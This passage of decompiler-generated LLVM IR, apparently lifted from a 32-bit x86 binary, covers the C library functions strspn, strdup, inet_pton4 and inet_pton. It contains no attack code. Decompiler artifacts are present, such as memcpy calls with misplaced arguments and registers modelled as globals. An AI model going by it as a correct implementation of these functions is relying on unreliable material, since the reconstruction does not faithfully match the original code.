  uselistorder label %dec_label_pc_804fb34, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804fae9, { 1, 0 }
  uselistorder label %dec_label_pc_804fae0, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_804fb5a30 = load i8, i8* %arg1, align 1
  %v4_804fb5c34 = icmp eq i8 %v2_804fb5a30, 0
  br i1 %v4_804fb5c34, label %dec_label_pc_804fb64, label %dec_label_pc_804fb60.lr.ph

dec_label_pc_804fb60.lr.ph:                       ; preds = %entry
  %v3_804fb5a31 = zext i8 %v2_804fb5a30 to i32
  %v4_804fb5a.pre = load i32, i32* @eax, align 4
  %v5_804fb5a32 = and i32 %v4_804fb5a.pre, -256
  %v6_804fb5a33 = or i32 %v3_804fb5a31, %v5_804fb5a32
  %v4_804fb41 = ptrtoint i8* %arg1 to i32
  %v1_804fb4c18 = inttoptr i32 %arg2 to i8*
  %v4_804fb4c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804fb60

dec_label_pc_804fb47:                             ; preds = %dec_label_pc_804fb60, %dec_label_pc_804fb4b
  %v6_804fb4c27 = phi i32 [ %v6_804fb4c, %dec_label_pc_804fb4b ], [ %v6_804fb4c22, %dec_label_pc_804fb60 ]
  %v2_804fb4c26 = phi i8 [ %v2_804fb4c, %dec_label_pc_804fb4b ], [ %v2_804fb4c19, %dec_label_pc_804fb60 ]
  %v0_804fb4b25 = phi i32 [ %v1_804fb4b, %dec_label_pc_804fb4b ], [ %arg2, %dec_label_pc_804fb60 ]
  %v15_804fb47 = icmp eq i8 %v2_804fb5a37, %v2_804fb4c26
  br i1 %v15_804fb47, label %dec_label_pc_804fb54, label %dec_label_pc_804fb4b

dec_label_pc_804fb4b:                             ; preds = %dec_label_pc_804fb47
  %v1_804fb4b = add i32 %v0_804fb4b25, 1
  store i32 %v1_804fb4b, i32* @edx, align 4
  %v1_804fb4c = inttoptr i32 %v1_804fb4b to i8*
  %v2_804fb4c = load i8, i8* %v1_804fb4c, align 1
  %v3_804fb4c = zext i8 %v2_804fb4c to i32
  %v5_804fb4c = and i32 %v6_804fb4c27, -256
  %v6_804fb4c = or i32 %v3_804fb4c, %v5_804fb4c
  store i32 %v6_804fb4c, i32* @ecx, align 4
  %v4_804fb4e = icmp eq i8 %v2_804fb4c, 0
  %v1_804fb50 = icmp eq i1 %v4_804fb4e, false
  br i1 %v1_804fb50, label %dec_label_pc_804fb47, label %dec_label_pc_804fb64

dec_label_pc_804fb54:                             ; preds = %dec_label_pc_804fb47
  %v1_804fb58 = add i32 %v0_804fb6435, 1
  %v1_804fb59 = add i32 %v0_804fb5936, 1
  %v1_804fb5a = inttoptr i32 %v1_804fb59 to i8*
  %v2_804fb5a = load i8, i8* %v1_804fb5a, align 1
  %v3_804fb5a = zext i8 %v2_804fb5a to i32
  %v5_804fb5a = and i32 %v6_804fb5a38, -256
  %v6_804fb5a = or i32 %v3_804fb5a, %v5_804fb5a
  %v4_804fb5c = icmp eq i8 %v2_804fb5a, 0
  br i1 %v4_804fb5c, label %dec_label_pc_804fb64, label %dec_label_pc_804fb60

dec_label_pc_804fb60:                             ; preds = %dec_label_pc_804fb60.lr.ph, %dec_label_pc_804fb54
  %v4_804fb4c.pre = phi i32 [ %v4_804fb4c.pre.pre, %dec_label_pc_804fb60.lr.ph ], [ %v6_804fb4c27, %dec_label_pc_804fb54 ]
  %v6_804fb5a38 = phi i32 [ %v6_804fb5a33, %dec_label_pc_804fb60.lr.ph ], [ %v6_804fb5a, %dec_label_pc_804fb54 ]
  %v2_804fb5a37 = phi i8 [ %v2_804fb5a30, %dec_label_pc_804fb60.lr.ph ], [ %v2_804fb5a, %dec_label_pc_804fb54 ]
  %v0_804fb5936 = phi i32 [ %v4_804fb41, %dec_label_pc_804fb60.lr.ph ], [ %v1_804fb59, %dec_label_pc_804fb54 ]
  %v0_804fb6435 = phi i32 [ 0, %dec_label_pc_804fb60.lr.ph ], [ %v1_804fb58, %dec_label_pc_804fb54 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804fb4c19 = load i8, i8* %v1_804fb4c18, align 1
  %v3_804fb4c20 = zext i8 %v2_804fb4c19 to i32
  %v5_804fb4c21 = and i32 %v4_804fb4c.pre, -256
  %v6_804fb4c22 = or i32 %v3_804fb4c20, %v5_804fb4c21
  store i32 %v6_804fb4c22, i32* @ecx, align 4
  %v4_804fb4e23 = icmp eq i8 %v2_804fb4c19, 0
  %v1_804fb5024 = icmp eq i1 %v4_804fb4e23, false
  br i1 %v1_804fb5024, label %dec_label_pc_804fb47, label %dec_label_pc_804fb64

dec_label_pc_804fb64:                             ; preds = %entry, %dec_label_pc_804fb54, %dec_label_pc_804fb60, %dec_label_pc_804fb4b
  %v0_804fb6417 = phi i32 [ %v0_804fb6435, %dec_label_pc_804fb4b ], [ %v0_804fb6435, %dec_label_pc_804fb60 ], [ 0, %entry ], [ %v1_804fb58, %dec_label_pc_804fb54 ]
  ret i32 %v0_804fb6417

; uselistorder directives
  uselistorder i32 %v6_804fb4c22, { 1, 0 }
  uselistorder i8 %v2_804fb4c19, { 1, 2, 0 }
  uselistorder i32 %v1_804fb59, { 1, 0 }
  uselistorder i32 %v6_804fb4c, { 1, 0 }
  uselistorder i8 %v2_804fb4c, { 1, 2, 0 }
  uselistorder i32 %v1_804fb4b, { 2, 1, 0 }
  uselistorder i8 %v2_804fb5a30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb64, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804fb60, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fb6c = load i32, i32* @edi, align 4
  %v0_804fb6d = load i32, i32* @esi, align 4
  %v0_804fb6e = load i32, i32* @ebx, align 4
  store i32 %v0_804fb6e, i32* %stack_var_-12, align 4
  %v4_804fb6f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb6f, i32* @edi, align 4
  %v3_804fb77 = call i32 @strlen(i8* %arg1)
  %v1_804fb7c = add i32 %v3_804fb77, 1
  store i32 %v1_804fb7c, i32* @esi, align 4
  %v2_804fb82 = call i32 @malloc(i32 %v1_804fb7c)
  store i32 %v2_804fb82, i32* %ebx.global-to-local, align 4
  %v1_804fb8c = icmp eq i32 %v2_804fb82, 0
  br i1 %v1_804fb8c, label %dec_label_pc_804fb9c, label %dec_label_pc_804fb90

dec_label_pc_804fb90:                             ; preds = %entry
  %v0_804fb91 = load i32, i32* @esi, align 4
  %v0_804fb92 = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_804fb82 to i16*
  %v6_804fb94 = call i32 @memcpy(i16* %tmp12, i32 %v0_804fb92, i32 %v0_804fb91)
  %v0_804fb9c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb9c

dec_label_pc_804fb9c:                             ; preds = %entry, %dec_label_pc_804fb90
  %v0_804fb9c = phi i32 [ 0, %entry ], [ %v0_804fb9c.pre, %dec_label_pc_804fb90 ]
  %v2_804fb9e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb9e, i32* @ebx, align 4
  store i32 %v0_804fb6d, i32* @esi, align 4
  store i32 %v0_804fb6c, i32* @edi, align 4
  ret i32 %v0_804fb9c

; uselistorder directives
  uselistorder i32 %v2_804fb82, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 5, 2, 0, 14, 13, 12, 1, 4, 3, 11, 10, 9, 8, 7, 6 }
  uselistorder label %dec_label_pc_804fb9c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804fba6 = load i32, i32* @esi, align 4
  %v0_804fbad = load i32, i32* @eax, align 4
  store i32 %v0_804fbad, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804fbb3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fbb3, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804fbfb15 = inttoptr i32 %v0_804fbad to i8*
  %v2_804fbfb16 = load i8, i8* %v1_804fbfb15, align 1
  %v3_804fbfb17 = sext i8 %v2_804fbfb16 to i32
  store i32 %v3_804fbfb17, i32* @ecx, align 4
  %v1_804fbfe18 = add i32 %v0_804fbad, 1
  store i32 %v1_804fbfe18, i32* %ebx.global-to-local, align 4
  %v1_804fbff19 = icmp eq i8 %v2_804fbfb16, 0
  %v1_804fc0120 = icmp eq i1 %v1_804fbff19, false
  br i1 %v1_804fc0120, label %dec_label_pc_804fbbe, label %dec_label_pc_804fc03.thread

dec_label_pc_804fc03.thread:                      ; preds = %entry
  br label %dec_label_pc_804fc20

dec_label_pc_804fbbe:                             ; preds = %entry, %dec_label_pc_804fbfb.backedge
  %v3_804fbfb22 = phi i32 [ %v3_804fbfb, %dec_label_pc_804fbfb.backedge ], [ %v3_804fbfb17, %entry ]
  %v2_804fbfb21 = phi i8 [ %v2_804fbfb, %dec_label_pc_804fbfb.backedge ], [ %v2_804fbfb16, %entry ]
  %v1_804fbbe = add nsw i32 %v3_804fbfb22, -48
  store i32 %v1_804fbbe, i32* %eax.global-to-local, align 4
  %v6_804fbc4 = icmp ugt i32 %v1_804fbbe, 9
  br i1 %v6_804fbc4, label %dec_label_pc_804fbe7, label %dec_label_pc_804fbc6

dec_label_pc_804fbc6:                             ; preds = %dec_label_pc_804fbbe
  %v0_804fbc6 = load i32, i32* @esi, align 4
  %v1_804fbc6 = inttoptr i32 %v0_804fbc6 to i8*
  %v2_804fbc6 = load i8, i8* %v1_804fbc6, align 1
  %v2_804fbc9 = zext i8 %v2_804fbc6 to i32
  %v3_804fbc9 = mul nuw nsw i32 %v2_804fbc9, 10
  %v3_804fbcc = add nsw i32 %v3_804fbc9, %v1_804fbbe
  store i32 %v3_804fbcc, i32* %eax.global-to-local, align 4
  %v6_804fbd5 = icmp ugt i32 %v3_804fbcc, 255
  br i1 %v6_804fbd5, label %dec_label_pc_804fc20, label %dec_label_pc_804fbd7

dec_label_pc_804fbd7:                             ; preds = %dec_label_pc_804fbc6
  %v1_804fbd7 = trunc i32 %v3_804fbcc to i8
  store i8 %v1_804fbd7, i8* %v1_804fbc6, align 1
  %v0_804fbd9 = load i32, i32* @edx, align 4
  %v1_804fbd9 = icmp eq i32 %v0_804fbd9, 0
  %v1_804fbdb = icmp eq i1 %v1_804fbd9, false
  br i1 %v1_804fbdb, label %dec_label_pc_804fbfb.backedge, label %dec_label_pc_804fbdd

dec_label_pc_804fbdd:                             ; preds = %dec_label_pc_804fbd7
  %v0_804fbdd = load i32, i32* @edi, align 4
  %v1_804fbdd = add i32 %v0_804fbdd, 1
  store i32 %v1_804fbdd, i32* @edi, align 4
  %v1_804fbde = add i32 %v0_804fbdd, -3
  %v6_804fbde = sub i32 2, %v0_804fbdd
  %v7_804fbde = and i32 %v6_804fbde, %v1_804fbdd
  %v8_804fbde = icmp slt i32 %v7_804fbde, 0
  %v9_804fbde = icmp eq i32 %v1_804fbde, 0
  %v10_804fbde = icmp slt i32 %v1_804fbde, 0
  %v3_804fbe1 = icmp eq i1 %v10_804fbde, %v8_804fbde
  %v4_804fbe1 = icmp eq i1 %v9_804fbde, false
  %v5_804fbe1 = and i1 %v4_804fbe1, %v3_804fbe1
  br i1 %v5_804fbe1, label %dec_label_pc_804fc20, label %dec_label_pc_804fbe3

dec_label_pc_804fbe3:                             ; preds = %dec_label_pc_804fbdd
  %v1_804fbe3 = and i32 %v0_804fbd9, -256
  %v2_804fbe3 = or i32 %v1_804fbe3, 1
  store i32 %v2_804fbe3, i32* @edx, align 4
  br label %dec_label_pc_804fbfb.backedge

dec_label_pc_804fbe7:                             ; preds = %dec_label_pc_804fbbe
  %v9_804fbe7 = icmp eq i8 %v2_804fbfb21, 46
  %v1_804fbea = icmp eq i1 %v9_804fbe7, false
  br i1 %v1_804fbea, label %dec_label_pc_804fc20, label %dec_label_pc_804fbec

dec_label_pc_804fbec:                             ; preds = %dec_label_pc_804fbe7
  %v0_804fbec = load i32, i32* @edx, align 4
  %v1_804fbec = icmp eq i32 %v0_804fbec, 0
  br i1 %v1_804fbec, label %dec_label_pc_804fc20, label %dec_label_pc_804fbf0

dec_label_pc_804fbf0:                             ; preds = %dec_label_pc_804fbec
  %v0_804fbf0 = load i32, i32* @edi, align 4
  %v9_804fbf0 = icmp eq i32 %v0_804fbf0, 4
  br i1 %v9_804fbf0, label %dec_label_pc_804fc20, label %dec_label_pc_804fbf5

dec_label_pc_804fbf5:                             ; preds = %dec_label_pc_804fbf0
  %v0_804fbf5 = load i32, i32* @esi, align 4
  %v1_804fbf5 = add i32 %v0_804fbf5, 1
  store i32 %v1_804fbf5, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804fbf8 = inttoptr i32 %v1_804fbf5 to i8*
  store i8 0, i8* %v1_804fbf8, align 1
  br label %dec_label_pc_804fbfb.backedge

dec_label_pc_804fbfb.backedge:                    ; preds = %dec_label_pc_804fbf5, %dec_label_pc_804fbe3, %dec_label_pc_804fbd7
  %v0_804fbfb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbfb = inttoptr i32 %v0_804fbfb.pre to i8*
  %v2_804fbfb = load i8, i8* %v1_804fbfb, align 1
  %v3_804fbfb = sext i8 %v2_804fbfb to i32
  store i32 %v3_804fbfb, i32* @ecx, align 4
  %v1_804fbfe = add i32 %v0_804fbfb.pre, 1
  store i32 %v1_804fbfe, i32* %ebx.global-to-local, align 4
  %v1_804fbff = icmp eq i8 %v2_804fbfb, 0
  %v1_804fc01 = icmp eq i1 %v1_804fbff, false
  br i1 %v1_804fc01, label %dec_label_pc_804fbbe, label %dec_label_pc_804fc03

dec_label_pc_804fc03:                             ; preds = %dec_label_pc_804fbfb.backedge
  %v0_804fc03.pre = load i32, i32* @edi, align 4
  %v7_804fc06 = icmp sgt i32 %v0_804fc03.pre, 3
  br i1 %v7_804fc06, label %dec_label_pc_804fc08, label %dec_label_pc_804fc20

dec_label_pc_804fc08:                             ; preds = %dec_label_pc_804fc03
  %v0_804fc08 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_804fbb3, i32* %eax.global-to-local, align 4
  %v3_804fc11 = bitcast i32* %stack_var_-20 to i16*
  %v4_804fc11 = call i32 @memcpy(i16* %v3_804fc11, i32 4, i32 %v0_804fc08)
  br label %dec_label_pc_804fc22

dec_label_pc_804fc20:                             ; preds = %dec_label_pc_804fbf0, %dec_label_pc_804fbec, %dec_label_pc_804fbe7, %dec_label_pc_804fbdd, %dec_label_pc_804fbc6, %dec_label_pc_804fc03.thread, %dec_label_pc_804fc03
  br label %dec_label_pc_804fc22

dec_label_pc_804fc22:                             ; preds = %dec_label_pc_804fc08, %dec_label_pc_804fc20
  %storemerge = phi i32 [ 0, %dec_label_pc_804fc20 ], [ 1, %dec_label_pc_804fc08 ]
  %v0_804fc29 = phi i32 [ 0, %dec_label_pc_804fc20 ], [ 1, %dec_label_pc_804fc08 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804fba6, i32* @esi, align 4
  ret i32 %v0_804fc29

; uselistorder directives
  uselistorder i32 %v3_804fbfb, { 1, 0 }
  uselistorder i8 %v2_804fbfb, { 1, 2, 0 }
  uselistorder i32 %v1_804fbde, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804fc22, { 1, 0 }
  uselistorder label %dec_label_pc_804fc20, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804fbbe, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804fc2a = load i32, i32* @ebp, align 4
  %v0_804fc2b = load i32, i32* @edi, align 4
  %v0_804fc2c = load i32, i32* @esi, align 4
  %v0_804fc2d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804fc35 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804fc35, i32* @edi, align 4
  %v9_804fc39 = icmp eq i32 %arg1, 2
  br i1 %v9_804fc39, label %dec_label_pc_804fc49, label %dec_label_pc_804fc3e

dec_label_pc_804fc3e:                             ; preds = %entry
  %v9_804fc3e = icmp eq i32 %arg1, 10
  %v1_804fc41 = icmp eq i1 %v9_804fc3e, false
  br i1 %v1_804fc41, label %dec_label_pc_804fdda, label %dec_label_pc_804fc59

dec_label_pc_804fc49:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_804fc35, i32* @eax, align 4
  %v3_804fc4f = call i32 @inet_pton4(i32 %v0_804fc2d, i32 %v0_804fc2c, i32 %v0_804fc2b)
  store i32 %v3_804fc4f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdec

dec_label_pc_804fc59:                             ; preds = %dec_label_pc_804fc3e
  %v2_804fc5e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fc5e, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_804fc63 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_804fc63, i32* @ebx, align 4
  %v2_804fc6a = add i32 %v5_804fc63, 16
  store i32 %v2_804fc6a, i32* %eax.global-to-local, align 4
  %v0_804fc74 = load i32, i32* @edi, align 4
  %v1_804fc74 = inttoptr i32 %v0_804fc74 to i8*
  %v2_804fc74 = load i8, i8* %v1_804fc74, align 1
  %v11_804fc74 = icmp eq i8 %v2_804fc74, 58
  %v1_804fc77 = icmp eq i1 %v11_804fc74, false
  br i1 %v1_804fc77, label %dec_label_pc_804fd0a, label %dec_label_pc_804fc79

dec_label_pc_804fc79:                             ; preds = %dec_label_pc_804fc59
  %v1_804fc79 = add i32 %v0_804fc74, 1
  store i32 %v1_804fc79, i32* @edi, align 4
  %v1_804fc7a = inttoptr i32 %v1_804fc79 to i8*
  %v2_804fc7a = load i8, i8* %v1_804fc7a, align 1
  %v11_804fc7a = icmp eq i8 %v2_804fc7a, 58
  %v1_804fc7d = icmp eq i1 %v11_804fc7a, false
  br i1 %v1_804fc7d, label %dec_label_pc_804fdea, label %dec_label_pc_804fd0a

dec_label_pc_804fc91:                             ; preds = %dec_label_pc_804fd4a
  %v0_804fc91 = load i32, i32* @ecx, align 4
  %v7_804fc99 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8052bb4.413, i32 0, i32 0), i32 %v2_804fd51, i32 %v0_804fc91, i32 %v0_804fc91)
  store i32 %v7_804fc99, i32* %eax.global-to-local, align 4
  %v0_804fc9e = load i32, i32* @edi, align 4
  %v1_804fc9e = add i32 %v0_804fc9e, 1
  store i32 %v1_804fc9e, i32* @edi, align 4
  %v1_804fca2 = icmp eq i32 %v7_804fc99, 0
  br i1 %v1_804fca2, label %dec_label_pc_804fcc1, label %dec_label_pc_804fca6

dec_label_pc_804fca6:                             ; preds = %dec_label_pc_804fc91
  %v0_804fca6 = load i32, i32* @ebp, align 4
  %v2_804fca6 = mul i32 %v0_804fca6, 16
  %v1_804fca9 = add i32 %v7_804fc99, -134556596
  store i32 %v1_804fca9, i32* %eax.global-to-local, align 4
  %v2_804fcae = or i32 %v2_804fca6, %v1_804fca9
  store i32 %v2_804fcae, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_804fcae, 65536
  br i1 %tmp127, label %dec_label_pc_804fd4a.outer, label %dec_label_pc_804fdea

dec_label_pc_804fd4a.outer:                       ; preds = %dec_label_pc_804fca6, %dec_label_pc_804fd0a
  %v0_804fd4d37 = phi i32 [ %v1_804fc9e, %dec_label_pc_804fca6 ], [ %stack_var_-36.0.in, %dec_label_pc_804fd0a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_804fca6 ], [ %stack_var_-44.0, %dec_label_pc_804fd0a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_804fca6 ], [ %stack_var_-36.0, %dec_label_pc_804fd0a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_804fca6 ], [ 0, %dec_label_pc_804fd0a ]
  %v4_804fcc6 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_804fccb = icmp eq i1 %v4_804fcc6, false
  br label %dec_label_pc_804fd4a

dec_label_pc_804fcc1:                             ; preds = %dec_label_pc_804fc91
  %v0_804fcc1 = load i32, i32* @esi, align 4
  %v9_804fcc1 = icmp eq i32 %v0_804fcc1, 58
  %v1_804fcc4 = icmp eq i1 %v9_804fcc1, false
  br i1 %v1_804fcc4, label %dec_label_pc_804fd16, label %dec_label_pc_804fcc6

dec_label_pc_804fcc6:                             ; preds = %dec_label_pc_804fcc1
  br i1 %v1_804fccb, label %dec_label_pc_804fce2, label %dec_label_pc_804fccd

dec_label_pc_804fccd:                             ; preds = %dec_label_pc_804fcc6
  %v5_804fccd = icmp eq i8* %stack_var_-44.1, null
  %v1_804fcd2 = icmp eq i1 %v5_804fccd, false
  br i1 %v1_804fcd2, label %dec_label_pc_804fdea, label %dec_label_pc_804fcd8

dec_label_pc_804fcd8:                             ; preds = %dec_label_pc_804fccd
  %v0_804fcd8 = load i32, i32* @ebx, align 4
  %v5_804fcd8 = inttoptr i32 %v0_804fcd8 to i8*
  %v5_804fcdc = inttoptr i32 %v1_804fc9e to i8*
  br label %dec_label_pc_804fd4a

dec_label_pc_804fce2:                             ; preds = %dec_label_pc_804fcc6
  %v1_804fce2 = inttoptr i32 %v1_804fc9e to i8*
  %v2_804fce2 = load i8, i8* %v1_804fce2, align 1
  %v3_804fce2 = icmp eq i8 %v2_804fce2, 0
  br i1 %v3_804fce2, label %dec_label_pc_804fdea, label %dec_label_pc_804fceb

dec_label_pc_804fceb:                             ; preds = %dec_label_pc_804fce2
  %v0_804fceb = load i32, i32* @ebx, align 4
  %v1_804fceb = add i32 %v0_804fceb, 2
  store i32 %v1_804fceb, i32* @edx, align 4
  %v6_804fcf2 = icmp ugt i32 %v1_804fceb, %v2_804fc6a
  br i1 %v6_804fcf2, label %dec_label_pc_804fdea, label %dec_label_pc_804fcf8

dec_label_pc_804fcf8:                             ; preds = %dec_label_pc_804fceb
  %v0_804fcf8 = load i32, i32* @ebp, align 4
  %v2_804fcfa = udiv i32 %v0_804fcf8, 256
  %v4_804fcfa = trunc i32 %v2_804fcfa to i8
  %v3_804fcfd = inttoptr i32 %v0_804fceb to i8*
  store i8 %v4_804fcfa, i8* %v3_804fcfd, align 1
  %v0_804fcff = load i32, i32* @ebp, align 4
  store i32 %v0_804fcff, i32* %eax.global-to-local, align 4
  %v1_804fd01 = trunc i32 %v0_804fcff to i8
  %v2_804fd01 = load i32, i32* @ebx, align 4
  %v3_804fd01 = add i32 %v2_804fd01, 1
  %v4_804fd01 = inttoptr i32 %v3_804fd01 to i8*
  store i8 %v1_804fd01, i8* %v4_804fd01, align 1
  %v0_804fd04 = load i32, i32* @edx, align 4
  store i32 %v0_804fd04, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fd0a

dec_label_pc_804fd0a:                             ; preds = %dec_label_pc_804fc59, %dec_label_pc_804fc79, %dec_label_pc_804fcf8
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_804fcf8 ], [ %v1_804fc79, %dec_label_pc_804fc79 ], [ %v0_804fc74, %dec_label_pc_804fc59 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_804fcf8 ], [ null, %dec_label_pc_804fc79 ], [ null, %dec_label_pc_804fc59 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804fd4a.outer

dec_label_pc_804fd16:                             ; preds = %dec_label_pc_804fcc1
  %v9_804fd16 = icmp eq i32 %v0_804fcc1, 46
  %v1_804fd19 = icmp eq i1 %v9_804fd16, false
  br i1 %v1_804fd19, label %dec_label_pc_804fdea, label %dec_label_pc_804fd1f

dec_label_pc_804fd1f:                             ; preds = %dec_label_pc_804fd16
  %v0_804fd1f = load i32, i32* @ebx, align 4
  %v1_804fd1f = add i32 %v0_804fd1f, 4
  store i32 %v1_804fd1f, i32* @esi, align 4
  %v6_804fd26 = icmp ugt i32 %v1_804fd1f, %v2_804fc6a
  br i1 %v6_804fd26, label %dec_label_pc_804fdea, label %dec_label_pc_804fd2c

dec_label_pc_804fd2c:                             ; preds = %dec_label_pc_804fd1f
  store i32 %v0_804fd1f, i32* @edx, align 4
  %v4_804fd2e = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_804fd2e, i32* @eax, align 4
  %v2_804fd32 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804fd32 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_804fd32, i32 %v2_804fc6a)
  store i32 %v5_804fd32, i32* %eax.global-to-local, align 4
  %v0_804fd37 = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_804fd32, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_804fd81, label %dec_label_pc_804fdea

dec_label_pc_804fd4a:                             ; preds = %dec_label_pc_804fd4a.outer, %dec_label_pc_804fcd8
  %v0_804fd4d = phi i32 [ %v1_804fc9e, %dec_label_pc_804fcd8 ], [ %v0_804fd4d37, %dec_label_pc_804fd4a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_804fcd8, %dec_label_pc_804fcd8 ], [ %stack_var_-44.1.ph, %dec_label_pc_804fd4a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_804fcdc, %dec_label_pc_804fcd8 ], [ %stack_var_-36.1.ph, %dec_label_pc_804fd4a.outer ]
  %v1_804fd4d = inttoptr i32 %v0_804fd4d to i8*
  %v2_804fd4d = load i8, i8* %v1_804fd4d, align 1
  %v3_804fd4d = sext i8 %v2_804fd4d to i32
  store i32 %v3_804fd4d, i32* %eax.global-to-local, align 4
  %v2_804fd51 = call i32 @__GI_tolower(i32 %v3_804fd4d)
  store i32 %v2_804fd51, i32* %eax.global-to-local, align 4
  store i32 %v2_804fd51, i32* @esi, align 4
  %v1_804fd5b = icmp eq i32 %v2_804fd51, 0
  %v1_804fd5d = icmp eq i1 %v1_804fd5b, false
  br i1 %v1_804fd5d, label %dec_label_pc_804fc91, label %dec_label_pc_804fd63

dec_label_pc_804fd63:                             ; preds = %dec_label_pc_804fd4a
  %v0_804fdb9.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_804fcc6, label %dec_label_pc_804fd81, label %dec_label_pc_804fd6a

dec_label_pc_804fd6a:                             ; preds = %dec_label_pc_804fd63
  %v1_804fd6a = add i32 %v0_804fdb9.pre.pre, 2
  store i32 %v1_804fd6a, i32* @edx, align 4
  %v6_804fd71 = icmp ugt i32 %v1_804fd6a, %v2_804fc6a
  br i1 %v6_804fd71, label %dec_label_pc_804fdea, label %dec_label_pc_804fd73

dec_label_pc_804fd73:                             ; preds = %dec_label_pc_804fd6a
  %v0_804fd73 = load i32, i32* @ebp, align 4
  %v2_804fd75 = udiv i32 %v0_804fd73, 256
  %v4_804fd75 = trunc i32 %v2_804fd75 to i8
  %v3_804fd78 = inttoptr i32 %v0_804fdb9.pre.pre to i8*
  store i8 %v4_804fd75, i8* %v3_804fd78, align 1
  %v0_804fd7a = load i32, i32* @ebp, align 4
  store i32 %v0_804fd7a, i32* %eax.global-to-local, align 4
  %v1_804fd7c = trunc i32 %v0_804fd7a to i8
  %v2_804fd7c = load i32, i32* @ebx, align 4
  %v3_804fd7c = add i32 %v2_804fd7c, 1
  %v4_804fd7c = inttoptr i32 %v3_804fd7c to i8*
  store i8 %v1_804fd7c, i8* %v4_804fd7c, align 1
  %v0_804fd7f = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fd81

dec_label_pc_804fd81:                             ; preds = %dec_label_pc_804fd63, %dec_label_pc_804fd2c, %dec_label_pc_804fd73
  %v0_804fdb9.pre = phi i32 [ %v0_804fd37, %dec_label_pc_804fd2c ], [ %v0_804fd7f, %dec_label_pc_804fd73 ], [ %v0_804fdb9.pre.pre, %dec_label_pc_804fd63 ]
  %v4_804fd81 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804fd81 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_804fd81, label %dec_label_pc_804fdb9, label %dec_label_pc_804fd88

dec_label_pc_804fd88:                             ; preds = %dec_label_pc_804fd81
  store i32 1, i32* @esi, align 4
  %v6_804fd8f = sub i32 %v0_804fdb9.pre, %v4_804fd81
  store i32 %v6_804fd8f, i32* @edi, align 4
  %v16_804fd93 = icmp eq i32 %v0_804fdb9.pre, %v2_804fc6a
  %v1_804fd97 = icmp eq i1 %v16_804fd93, false
  br i1 %v1_804fd97, label %dec_label_pc_804fdb1.preheader, label %dec_label_pc_804fdea

